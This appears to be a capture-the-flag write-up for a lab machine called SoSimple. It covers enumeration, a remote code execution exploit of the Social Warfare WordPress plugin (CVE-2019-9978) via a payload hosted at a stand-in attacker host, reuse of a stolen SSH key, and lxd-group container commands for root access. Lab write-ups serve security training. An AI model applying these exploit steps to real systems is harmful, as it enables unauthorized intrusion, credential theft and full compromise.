# SoSimple

## Enumeration&#x20;

### Nmap scan

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 15:12:29:ed:80:39:66:3b:d7:ab:30:5e:56:10:99:b4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChV8yuBLzhemTOE7EIxjXOZfsD4GFksZmZA1RZ24s2acdQYTrufuyvLt+p/VdF726MUIrDYlZA0/sZBn95WeEZI0lWC7746VMgk8iKyTICQ75JA7chd0TzJ+ZVctv5ac8l8bNe5ziIFX19eR+gfrHwfEAbddXncUEChOvAyCjz7BG8ARKABl4RiYcRS+AvRPLXPgaW7URCSaZbwwC7o0KLlwUwNwDB3g5kE0gtP8nCUszGz1Fvc4SEoBVbogth9jls95V0Bx1a2UUBj8b8Iy04CPsUPv8rsuz5dUNSlEfcNanDzJ23sYgXbH7ZbMHra2Ka7XQOSBcST4fCyjb8z4WcCSAx4DZZlG6HJb+qYa151Fnl5KsobQ9EOnp/+roK+NrK5GNbW1xA9jdW8/QtWIGt6jQbQ8HUKmXEitHt/wcbNQqiHoR43iMOJWgZpUJALZm2J7A6mzRCHC+nQGxILIxnG1gHHtKYPi23osQg5UjBu4n/ufnWKrReciHa1GKLNSM=
|   256 92:c8:ad:d1:2f:4a:41:c3:42:e6:fd:bb:76:6f:c4:7f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNUjVvg16qjYfh2VmPSQduOkMLMdO8OMxzZrvdfs0pusHMu2A9Az9RIkVQIyKsVwW+p1Vt1F4/OZJBQ7v17MWaE=
|   256 db:3e:68:86:53:32:57:ce:6c:9f:98:cc:af:57:51:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFMRtWOgKCvQen16dbIsWTjXI3glXQSD8G9RGjV4FSc1
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete

```



### Port 80 - HTTP

Ran **`ffuf`** against the target to enumerate hidden directories and files and found wordpress&#x20;

<figure><img src="../.gitbook/assets/image (624).png" alt=""><figcaption></figcaption></figure>



Using `wpscan`, I found the site was running an old version (3.5.0) of the Social Warfare plugin. This version has a known bug (CVE-2019-9978) that lets anyone run commands on the server without even logging in

#### CVE-[https://www.cve.org/CVERecord?id=CVE-2019-9978](https://www.cve.org/CVERecord?id=CVE-2019-9978)

<figure><img src="../.gitbook/assets/image (625).png" alt=""><figcaption></figcaption></figure>

#### PoC for social warfare v3.5.0

```
1. Create payload file and host it on a location accessible by a targeted website. Payload content : "<pre>system('cat /etc/passwd')</pre>"

2. Visit http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt

3. Content of /etc/passwd will be returned
```

#### Exploit - [https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/)

Using the Social Warfare bug, I was able to read `/etc/passwd` to confirm the exploit worked, then sent a basic bash reverse shell command through it. This gave me a full terminal session on the box

<figure><img src="../.gitbook/assets/image (626).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (627).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

While exploring the box, I found `local.txt` in max’s home directory, and also got access to his `.ssh` private key (`id_rsa`). I used that key to log in over SSH, which gave me a much more stable shell than the reverse shell.

<figure><img src="../.gitbook/assets/image (629).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (630).png" alt=""><figcaption></figcaption></figure>



### Port 22 - SSH&#x20;

<figure><img src="../.gitbook/assets/image (631).png" alt=""><figcaption></figcaption></figure>



### Privilege Escalation via lxd group

Logged in as max over SSH, and noticed he was part of the **lxd** group. This group can be abused to get root by building a privileged LXD container that mounts the host’s filesystem, you get full access to the root filesystem from inside the container. Used this trick to escalate straight to root



#### PoC for lxd group

```
Command:- 
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
lxc image import *.tar.gz --alias myimage
lxc image list
lxc init myimage shell -c security.privileged=true
lxc start shell
lxc ls
lxc exec shell /bin/sh

for storage errors:-
lxd init
lxc init myimage shell -c security.privileged=true
lxc config device add shell mydevice disk source=/ path=/mnt/root recursive=true
lxc start shell
lxc ls
lxc exec shell /bin/sh
```



<figure><img src="../.gitbook/assets/image (632).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (633).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (634).png" alt=""><figcaption></figcaption></figure>
